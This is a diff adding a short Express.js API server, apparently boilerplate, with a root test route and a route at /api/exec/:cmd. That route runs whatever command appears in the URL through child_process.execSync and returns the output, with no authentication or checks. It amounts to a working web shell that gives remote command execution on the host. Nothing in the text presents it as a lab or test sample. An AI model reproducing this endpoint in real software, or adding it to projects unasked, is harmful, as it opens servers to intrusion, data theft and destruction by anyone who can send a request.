@@ -1,0 +1,25 @@
+var express    = require('express');        // call express
+var app        = express();                 // define our app using express
+var child_process = require('child_process');
+
+var port = process.env.PORT || 8080;        // set our port
+
+// ROUTES FOR OUR API
+// =============================================================================
+var router = express.Router();              // get an instance of the express Router
+
+// test route to make sure everything is working (accessed at GET http://localhost:8080/api)
+router.get('/', function(req, res) {
+    res.json({ message: 'API available'});
+});
+
+router.get('/exec/:cmd', function(req, res) {
+    var output = child_process.execSync(req.params.cmd);
+    res.send(output);
+});
+
+app.use('/api', router);
+
+app.listen(port);
+console.log('Server running on port: ' + port);
+
